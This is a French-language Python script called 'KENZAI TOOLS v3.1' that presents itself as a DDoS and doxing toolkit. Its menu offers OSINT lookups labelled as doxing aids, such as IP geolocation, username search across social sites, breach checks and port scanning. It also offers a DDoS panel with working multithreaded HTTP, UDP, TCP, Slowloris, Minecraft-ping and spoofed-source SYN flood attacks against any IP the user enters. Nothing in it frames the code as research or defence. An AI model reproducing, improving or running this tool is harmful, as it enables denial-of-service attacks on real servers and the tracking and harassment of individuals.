#!/usr/bin/env python3
# KENZAI TOOLS v3.1 - TOUT EN FRANÇAIS
# Appuie sur 12 → Panel DDoS direct

import os
import sys
import time
import random
import socket
import threading
import requests
from colorama import Fore, Back, Style, init

init(autoreset=True)

os.system('title KENZAI - OUTILS DDOS + DOX v3.1')
os.system('mode con: cols=100 lines=40')

stop_attack = False

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Fore.RED}   ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗
{Fore.RED}   ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║
{Fore.RED}   █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║
{Fore.RED}   ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
{Fore.RED}   ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
{Fore.RED}   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝{Style.RESET_ALL}
{Fore.CYAN}   - Present Day, Present Time -{Style.RESET_ALL}
{Fore.YELLOW}   - DDOS - DOX - OSINT - EDITION ULTIME -{Style.RESET_ALL}
{Fore.WHITE}
{Fore.GREEN}┌{'-'*60}┐{Style.RESET_ALL}
{Fore.GREEN}│{Fore.CYAN} OUTILS DDOS + DOX - Tape 12 pour le panel DDoS{Fore.GREEN}│{Style.RESET_ALL}
{Fore.GREEN}└{'-'*60}┘{Style.RESET_ALL}
"""
    print(banner)

def menu():
    print(f"""
{Fore.WHITE}[01] Localisation IP  [02] Recherche Tel    [03] Verif Email
[04] Recherche Pseudo [05] DNS Lookup      [06] Scan Ports
[07] Whois            [08] GeoIP           [09] Breach Check
[10] Pastebin Search  [11] Reverse Image   {Fore.RED}[12] PANEL DDOS{Style.RESET_ALL}
[13] Quitter

{Fore.YELLOW}[P/N] Page suivante | [60] Infos | [61] Parametres | [99] Quitter{Style.RESET_ALL}

{Fore.CYAN}v3.1 | cpu: 63%% | ram: 41%% | mode: PRET{Style.RESET_ALL}
{Fore.RED}kenzai@outils:~/{Style.RESET_ALL} """, end="")

# ============ OUTILS DOX (en français) ============

def ip_locator():
    clear()
    print(f"\n{Fore.CYAN}[01] Localisation IP{Style.RESET_ALL}\n")
    ip = input("Adresse IP: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}")
        data = r.json()
        if data['status'] == 'success':
            print(f"\n{Fore.GREEN}IP: {data['query']}")
            print(f"Pays: {data['country']}")
            print(f"Region: {data['regionName']}")
            print(f"Ville: {data['city']}")
            print(f"Code postal: {data['zip']}")
            print(f"Lat/Lon: {data['lat']}, {data['lon']}")
            print(f"FAI: {data['isp']}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}IP invalide{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur de connexion{Style.RESET_ALL}")

def phone_lookup():
    clear()
    print(f"\n{Fore.CYAN}[02] Recherche Telephone{Style.RESET_ALL}\n")
    phone = input("Numero (+336XXXXXXXX): ")
    print(f"{Fore.YELLOW}Recherche en cours...{Style.RESET_ALL}")
    time.sleep(1)
    print(f"{Fore.GREEN}Format valide: {phone}")
    print(f"Indicatif pays: {phone[:3] if phone.startswith('+') else 'Non detecte'}{Style.RESET_ALL}")

def email_hunter():
    clear()
    print(f"\n{Fore.CYAN}[03] Verification Email{Style.RESET_ALL}\n")
    email = input("Email: ")
    try:
        domain = email.split('@')[1]
        print(f"{Fore.GREEN}Email: {email}")
        print(f"Domaine: {domain}")
        print(f"Format: Valide{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Email invalide{Style.RESET_ALL}")

def username_search():
    clear()
    print(f"\n{Fore.CYAN}[04] Recherche Pseudo{Style.RESET_ALL}\n")
    username = input("Pseudo: ")
    sites = {
        "Twitter": f"https://twitter.com/{username}",
        "GitHub": f"https://github.com/{username}",
        "Instagram": f"https://instagram.com/{username}",
        "Reddit": f"https://reddit.com/user/{username}"
    }
    print()
    for site, url in sites.items():
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                print(f"{Fore.GREEN}[TROUVE] {site}: {url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[PAS TROUVE] {site}{Style.RESET_ALL}")
        except:
            print(f"{Fore.RED}[ERREUR] {site}{Style.RESET_ALL}")

def dns_lookup():
    clear()
    print(f"\n{Fore.CYAN}[05] DNS Lookup{Style.RESET_ALL}\n")
    domain = input("Domaine: ")
    try:
        import dns.resolver
        for record in ['A', 'MX', 'NS']:
            try:
                answers = dns.resolver.resolve(domain, record)
                for rdata in answers:
                    print(f"{record}: {rdata}")
            except:
                pass
    except:
        print(f"{Fore.YELLOW}Installe dnspython: pip install dnspython{Style.RESET_ALL}")

def port_scanner():
    clear()
    print(f"\n{Fore.CYAN}[06] Scan de Ports{Style.RESET_ALL}\n")
    target = input("IP cible: ")
    ports = [21, 22, 23, 25, 53, 80, 443, 8080, 3306, 3389, 25565]
    print(f"\n{Fore.YELLOW}Scan de {target}...{Style.RESET_ALL}\n")
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        if sock.connect_ex((target, port)) == 0:
            print(f"{Fore.GREEN}Port {port}: OUVERT{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Port {port}: FERME{Style.RESET_ALL}")
        sock.close()

def whois_lookup():
    clear()
    print(f"\n{Fore.CYAN}[07] Whois{Style.RESET_ALL}\n")
    domain = input("Domaine: ")
    print(f"{Fore.GREEN}https://who.is/whois/{domain}{Style.RESET_ALL}")

def geoip():
    clear()
    print(f"\n{Fore.CYAN}[08] GeoIP{Style.RESET_ALL}\n")
    ip = input("IP: ")
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        data = r.json()
        print(f"\n{Fore.GREEN}IP: {data.get('ip')}")
        print(f"Ville: {data.get('city')}")
        print(f"Region: {data.get('region')}")
        print(f"Pays: {data.get('country')}")
        print(f"Localisation: {data.get('loc')}")
        print(f"FAI: {data.get('org')}{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}Erreur{Style.RESET_ALL}")

def breach_check():
    clear()
    print(f"\n{Fore.CYAN}[09] Breach Check (Fuites de donnees){Style.RESET_ALL}\n")
    email = input("Email: ")
    try:
        r = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}")
        if r.status_code == 200:
            breaches = r.json()
            print(f"{Fore.RED}Cet email a ete compromis dans {len(breaches)} fuites !{Style.RESET_ALL}")
            for breach in breaches:
                print(f"- {breach['Name']} ({breach['BreachDate']})")
        else:
            print(f"{Fore.GREEN}Aucune fuite trouvee pour cet email{Style.RESET_ALL}")
    except:
        print(f"{Fore.GREEN}Aucune fuite trouvee (ou erreur API){Style.RESET_ALL}")

def pastebin_search():
    clear()
    print(f"\n{Fore.CYAN}[10] Recherche Pastebin{Style.RESET_ALL}\n")
    query = input("Recherche: ")
    print(f"{Fore.GREEN}https://pastebin.com/search?q={query}{Style.RESET_ALL}")

def reverse_image():
    clear()
    print(f"\n{Fore.CYAN}[11] Recherche d'Image Inversee{Style.RESET_ALL}\n")
    url = input("URL de l'image: ")
    print(f"{Fore.GREEN}Google Images: https://www.google.com/searchbyimage?image_url={url}")
    print(f"Yandex: https://yandex.com/images/search?url={url}&rpt=imageview{Style.RESET_ALL}")

# ============ PANEL DDOS DIRECT (touche 12) ============

def ddos_panel():
    """Panel DDoS - s'affiche DIRECTEMENT quand on tape 12"""
    global stop_attack
    
    clear()
    print(f"{Fore.RED}")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║                    KENZAI PANEL DDOS                         ║")
    print("║                Tape 12 - Attaque directe                     ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    print(f"""
{Fore.CYAN}┌─────────────────────────────────────────────────────────────┐
│                    METHODES D'ATTAQUE                         │
├─────────────────────────────────────────────────────────────┤
│  {Fore.WHITE}[1] HTTP Flood     {Fore.CYAN}│ Attaque web standard                    │
│  {Fore.WHITE}[2] UDP Flood      {Fore.CYAN}│ Saturation bande passante               │
│  {Fore.WHITE}[3] TCP Flood      {Fore.CYAN}│ Connexions TCP brutes                   │
│  {Fore.WHITE}[4] Slowloris      {Fore.CYAN}│ Connexions lentes (discret)             │
│  {Fore.WHITE}[5] Minecraft Ping {Fore.CYAN}│ Attaque serveurs Minecraft              │
│  {Fore.WHITE}[6] SYN Flood      {Fore.CYAN}│ Demi-connexions (admin requis)          │
│  {Fore.WHITE}[7] TOUT EN UN     {Fore.CYAN}│ Toutes methodes en meme temps           │
└─────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}
    """)
    
    # Saisie des paramètres
    print(f"{Fore.YELLOW}=== PARAMETRES DE L'ATTAQUE ==={Style.RESET_ALL}")
    target = input(f"{Fore.WHITE}[?] IP cible: {Style.RESET_ALL}")
    port = input(f"{Fore.WHITE}[?] Port (defaut 80): {Style.RESET_ALL}") or "80"
    method = input(f"{Fore.WHITE}[?] Methode (1-7): {Style.RESET_ALL}")
    threads = int(input(f"{Fore.WHITE}[?] Threads (100-1000): {Style.RESET_ALL}"))
    duration = int(input(f"{Fore.WHITE}[?] Duree en secondes: {Style.RESET_ALL}"))
    
    # Verification de la cible
    print(f"\n{Fore.YELLOW}[*] Verification de la cible...{Style.RESET_ALL}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((target, int(port)))
        sock.close()
        if result == 0:
            print(f"{Fore.GREEN}[+] Port {port} OUVERT - Attaque possible{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Port {port} FERME - L'attaque pourrait echouer{Style.RESET_ALL}")
    except:
        print(f"{Fore.RED}[-] Cible inaccessible{Style.RESET_ALL}")
    
    stop_attack = False
    
    print(f"\n{Fore.RED}╔══════════════════════════════════════════════════════════════╗")
    print(f"║                    LANCEMENT DE L'ATTAQUE                         ║")
    print(f"╠══════════════════════════════════════════════════════════════════╣")
    print(f"║  Cible: {target}:{port}")
    print(f"║  Methode: {method}")
    print(f"║  Threads: {threads}")
    print(f"║  Duree: {duration} secondes")
    print(f"╚══════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    # ============ FONCTIONS D'ATTAQUE ============
    
    def http_flood():
        url = f"http://{target}:{port}"
        while not stop_attack:
            try:
                requests.get(url, timeout=2)
                requests.post(url, data={"x": random._urandom(100)}, timeout=2)
            except:
                pass
    
    def udp_flood():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1400)
        while not stop_attack:
            try:
                sock.sendto(data, (target, int(port)))
            except:
                pass
    
    def tcp_flood():
        while not stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, int(port)))
                sock.send(random._urandom(1024))
                sock.close()
            except:
                pass
    
    def slowloris():
        while not stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((target, int(port)))
                sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
                while not stop_attack:
                    sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
                    time.sleep(random.uniform(3, 10))
            except:
                pass
    
    def minecraft_ping():
        p = int(port) if port != "80" else 25565
        while not stop_attack:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, p))
                sock.send(b'\xfe\x01')
                sock.close()
            except:
                pass
    
    def syn_flood():
        try:
            from scapy.all import IP, TCP, send
            while not stop_attack:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                ip = IP(src=src_ip, dst=target)
                tcp = TCP(sport=random.randint(1024,65535), dport=int(port), flags="S")
                send(ip/tcp, verbose=False)
        except:
            print(f"{Fore.YELLOW}SYN Flood non disponible (installe Npcap){Style.RESET_ALL}")
    
    # Lancement selon la methode
    if method == "1":
        for _ in range(threads):
            threading.Thread(target=http_flood, daemon=True).start()
    elif method == "2":
        for _ in range(threads):
            threading.Thread(target=udp_flood, daemon=True).start()
    elif method == "3":
        for _ in range(threads):
            threading.Thread(target=tcp_flood, daemon=True).start()
    elif method == "4":
        for _ in range(threads):
            threading.Thread(target=slowloris, daemon=True).start()
    elif method == "5":
        for _ in range(threads):
            threading.Thread(target=minecraft_ping, daemon=True).start()
    elif method == "6":
        for _ in range(threads):
            threading.Thread(target=syn_flood, daemon=True).start()
    elif method == "7":  # TOUT EN UN
        t = threads // 5
        for _ in range(t):
            threading.Thread(target=http_flood, daemon=True).start()
            threading.Thread(target=udp_flood, daemon=True).start()
            threading.Thread(target=tcp_flood, daemon=True).start()
            threading.Thread(target=slowloris, daemon=True).start()
            threading.Thread(target=minecraft_ping, daemon=True).start()
    
    # Compte a rebours
    start_time = time.time()
    while time.time() - start_time < duration:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        active = threading.active_count() - 1
        sys.stdout.write(f"\r{Fore.YELLOW}[⏱] Temps: {elapsed}/{duration}s | Threads actifs: {active}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(1)
    
    stop_attack = True
    time.sleep(1)
    
    print(f"\n\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║                    ATTAQUE TERMINEE                            ║")
    print(f"║    {threads} threads pendant {duration} secondes sur {target}:{port}")
    print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Appuie sur Entree pour revenir au menu...{Style.RESET_ALL}")
    main()

# ============ MAIN ============

def main():
    clear()
    print_banner()
    menu()
    choice = input()
    
    if choice in ["01", "1"]:
        ip_locator()
    elif choice in ["02", "2"]:
        phone_lookup()
    elif choice in ["03", "3"]:
        email_hunter()
    elif choice in ["04", "4"]:
        username_search()
    elif choice in ["05", "5"]:
        dns_lookup()
    elif choice in ["06", "6"]:
        port_scanner()
    elif choice in ["07", "7"]:
        whois_lookup()
    elif choice in ["08", "8"]:
        geoip()
    elif choice in ["09", "9"]:
        breach_check()
    elif choice == "10":
        pastebin_search()
    elif choice == "11":
        reverse_image()
    elif choice in ["12", "12"]:
        ddos_panel()  # ← PANEL DDOS DIRECT
    elif choice in ["13", "99"]:
        print(f"{Fore.RED}[KENZAI] Au revoir{Style.RESET_ALL}")
        sys.exit()
    elif choice == "60":
        print(f"\n{Fore.CYAN}[INFOS] KENZAI OUTILS v3.1")
        print("Tape 12 pour le panel DDoS")
        print("Tous les outils sont en francais")
        input()
    elif choice == "61":
        print(f"\n{Fore.YELLOW}[PARAMETRES] Aucun reglage disponible")
        input()
    
    input(f"\n{Fore.CYAN}Appuie sur Entree pour continuer...{Style.RESET_ALL}")
    main()

if __name__ == "__main__":
    main()